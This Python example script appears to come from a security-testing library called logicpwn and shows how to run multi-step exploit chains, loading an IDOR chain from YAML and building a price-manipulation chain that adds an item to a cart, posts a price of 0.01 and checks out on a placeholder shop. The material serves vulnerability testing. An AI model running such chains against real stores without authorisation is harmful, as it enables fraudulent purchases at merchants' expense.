"""
Example 3: Exploit Chain Execution
====================================

Run multi-step exploit chains from YAML configuration files.
Perfect for automated vulnerability testing and regression checks.

What this demonstrates:
- Loading exploit chains from YAML
- Executing multi-step attacks
- Analyzing step-by-step results
"""

from logicpwn import quick_exploit_chain
from logicpwn.results import ExploitChainResult

# Example 1: Run a simple exploit chain
print("=" * 60)
print("Running Simple IDOR Exploit Chain")
print("=" * 60)

results = quick_exploit_chain("../simple_exploit_corrected.yaml")

# Analyze results
successful_steps = sum(1 for r in results if r.status.value == "success")
print(f"\nCompleted: {successful_steps}/{len(results)} steps")

for result in results:
    status_icon = "‚úÖ" if result.status.value == "success" else "‚ùå"
    print(f"{status_icon} {result.step_name}")
    if result.validation_result:
        print(f"   Matched indicators: {result.validation_result.matched_indicators}")

# Example 2: Programmatic exploit chain creation
print("\n" + "=" * 60)
print("Creating Exploit Chain Programmatically")
print("=" * 60)

from logicpwn import ExploitChain, ExploitStep, run_exploit_chain
from logicpwn.models import RequestConfig

# Build custom exploit chain
chain = ExploitChain(
    name="Price Manipulation Test",
    description="Test for business logic flaw in checkout process",
    session_state={"product_id": "PROD123"},
    steps=[
        ExploitStep(
            name="Add Product to Cart",
            request_config=RequestConfig(
                method="POST",
                url="https://shop.example.com/api/cart/add",
                json_data={"product_id": "PROD123", "quantity": 1},
            ),
            success_indicators=["cart_updated", "success"],
            retry_count=2,
        ),
        ExploitStep(
            name="Manipulate Price",
            request_config=RequestConfig(
                method="POST",
                url="https://shop.example.com/api/cart/update",
                json_data={"product_id": "PROD123", "price": 0.01, "quantity": 100},
            ),
            success_indicators=["updated"],
            failure_indicators=["invalid", "error", "price_validation_failed"],
            critical=True,  # Stop if this fails
        ),
        ExploitStep(
            name="Checkout",
            request_config=RequestConfig(
                method="POST",
                url="https://shop.example.com/api/checkout",
                json_data={"confirm": True},
            ),
            success_indicators=["order_confirmed", "payment_successful"],
        ),
    ],
)

# Execute the chain
results = run_exploit_chain(chain)

# Create result object for analysis
chain_result = ExploitChainResult(
    chain_name=chain.name,
    total_steps=len(results),
    successful_steps=sum(1 for r in results if r.status.value == "success"),
    failed_steps=sum(1 for r in results if r.status.value != "success"),
    step_results=results,
)

print(chain_result.summary())

# Vulnerability assessment
if chain_result.all_succeeded:
    print("\nüö® VULNERABILITY CONFIRMED: Price manipulation successful!")
else:
    print("\n‚úÖ Secure: Price manipulation prevented")
